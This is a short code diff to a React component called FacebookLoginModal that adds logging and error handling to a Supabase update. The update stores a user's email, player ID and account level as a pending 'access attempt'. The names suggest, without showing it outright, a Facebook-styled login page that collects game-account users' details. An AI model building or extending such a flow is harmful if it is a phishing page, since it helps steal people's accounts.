@@ -66,8 +66,13 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
     accountLevel: string;
   }) => {
     try {
+      console.log('Updating verification data:', {
+        email: userLoginData?.email,
+        verificationData
+      });
+      
       // Update the existing pending record with verification data
-      await supabase
+      const { data, error } = await supabase
         .from('access_attempts')
         .update({
           player_uid: verificationData.playerId,
@@ -77,6 +82,12 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
         })
         .eq('email', userLoginData?.email || '')
         .eq('status', 'pending');
+
+      if (error) {
+        console.error('Supabase update error:', error);
+      } else {
+        console.log('Update successful:', data);
+      }
 
       setShowVerification(false);
       setShowAccountProcess(true);
